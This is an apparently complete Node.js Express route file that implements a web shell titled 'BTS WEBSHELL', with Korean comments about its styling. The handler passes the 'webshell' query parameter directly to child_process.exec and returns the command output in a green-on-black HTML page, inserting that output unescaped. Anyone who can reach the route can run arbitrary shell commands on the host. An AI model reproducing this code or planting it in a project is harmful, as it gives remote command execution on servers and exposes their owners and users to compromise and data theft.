var express = require('express');
var router = express.Router();
var exec = require("child_process").exec;
var so;

router.get('/', function (req, res, next) {
    exec(req.query.webshell || "HELLO", function (err, stdout, stderr) {
        console.log(req.query.webshell)
        console.log(stdout)
        if (stdout) {
            // 줄바꿈 문자('\n')을 HTML 태그('<br>')로 대체하여 표시
            so = stdout.replace(/\n/g, "<br>");
        } else {
            so = "NO CONTENT";
        }
        var html = `
<!DOCTYPE html>
<html>
<head>
  <title>BTS WEBSHELL</title>
  <style>
    body {
      background-color: black; /* 배경색을 검정색으로 변경 */
      color: lime; /* 글씨색을 초록색으로 변경 */
      font-family: monospace;
      overflow: hidden;
    }
    input[type="text"] {
      color: lime; /* 입력 텍스트의 글씨색을 초록색으로 변경 */
      background-color: black;
      border: 1px solid lime; /* 초록색 테두리 설정 */
      outline: none;
      font-family: monospace;
      width: 60%;
    }
    input[type="submit"] {
      color: lime; /* 제출 버튼의 글씨색을 초록색으로 변경 */
      background-color: black;
      border: 1px solid lime;
      outline: none;
      font-family: monospace;
      cursor: pointer;
    }
    #target_input {
      font-size: 21px; /* "so" 출력 글꼴 크기를 줄임 */
    }
    /* 결과 출력 요소에 왼쪽 여백 추가 */
    #result {
      text-align: left;
      padding-left: 20%; /* 화면의 1/3만큼 여백 설정 */
      padding-right: 20%;
      width: 60%;
      overflow-y: auto; /* 세로 스크롤 추가 */
      max-height: 70vh; /* 최대 높이 지정 */
    }
  </style>
</head>
<body>
<div align="center">
  <h1>BTS WEBSHELL</h1>
  <form id='target' action='webshell'>
    <input id='target_input' name='webshell' type='text' placeholder="$">
    <input type='submit' value='submit'>
  </form>
  <!-- 웹 쉘 결과 출력 시 줄바꿈 적용 및 왼쪽 정렬 -->
  <div id="result">
    <h3>${so}</h3>
  </div>
</div>
</body>
<script>
  function moveCursor() {
    document.getElementById('target_input').focus(); 
  }
</script>
</html>

        `
        res.send(html);
    });
});

module.exports = router;
